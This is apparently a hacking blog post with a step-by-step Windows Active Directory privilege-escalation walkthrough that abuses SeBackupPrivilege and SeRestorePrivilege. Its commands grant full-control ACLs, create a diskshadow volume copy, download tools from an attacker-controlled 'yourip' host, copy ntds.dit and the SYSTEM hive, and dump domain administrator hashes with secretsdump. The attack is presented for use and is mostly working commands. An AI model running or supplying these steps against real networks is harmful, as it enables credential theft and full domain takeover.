[back](/blog)

### Glad to see you domain admin

What can domain users with "SeBackupPrivilege" and "SeRestorePrivilege" privileges do?

![Image](/img/sebackup_and_serestore/1.png)

![Image](/img/sebackup_and_serestore/2.png)

Such user can easily get the domain administrator access. Firstly, using these privileges, you can assign an ACL with the "FullControl" flag to any directory and any file in the system (does not apply to encrypted files by EFS), this means "full rights" to read and write.

```
Import-Module ./Acl-FullControl.ps1
Acl-FullControl -user FQDN\domainuser -path c:\users\administrator - get access to any path
```

However, the juiciest files SAM, SYSTEM, SECURITY and NTDS.DIT will remain inaccessible (despite what works "reg save HKLM...), even with full rights due to constant use. But using the diskshadow utility (functionality provided by the Volume Shadow Copy Service) will help you create a shadow copy of the local disk with ntds.dit, and further mimicking the backup program using WIN32 API calls will help move ndts.dit to your local drive. 

```
shad.txt: - do not forget to add spaces =)
_________

set context clientaccessible   
set context persistent   
begin backup   
add volume c: alias mydrive  
create  
expose %mydrive% z:  
_________

powershell.exe Invoke-WebRequest "http://yourip/shad.txt -OutFile ./shad.txt"
diskshadow.exe /s C:\temp\ntdscopy\shad.txt
```

![Image](/img/sebackup_and_serestore/5.png)

then

```
powershell.exe Invoke-WebRequest "http://yourip/SeBackupPrivilegeCmdLets.dll -OutFile ./SeBackupPrivilegeCmdLets.dll"
powershell.exe Invoke-WebRequest "http://yourip/SeBackupPrivilegeUtils.dll -OutFile ./SeBackupPrivilegeUtils.dll"

Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
Set-SeBackupPrivilege

Copy-FileSeBackupPrivilege z:\windows\NTDS\ntds.dit c:\tmp\ntds.dit - now u got ntds.git copy =)

reg save HKLM\system system.save
```

Then "secretsdump" will help you get the hash of the domain administrator from ntds.dit without much difficulty =)

```
python secretsdump.py -ntds /tmp/ntds.dit -system /tmp/system.save LOCAL
```

Glad to see you domain admin =)

Everything you need is here:

+ [Abusing-backup-operators-group](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#abusing-backup-operators-group)
+ [Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
+ [SeBackupPrivilegeCmdLets](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)

<div id="disqus_thread"></div>
<script>
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://hackitfaster-hopto-org.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

[back](/blog)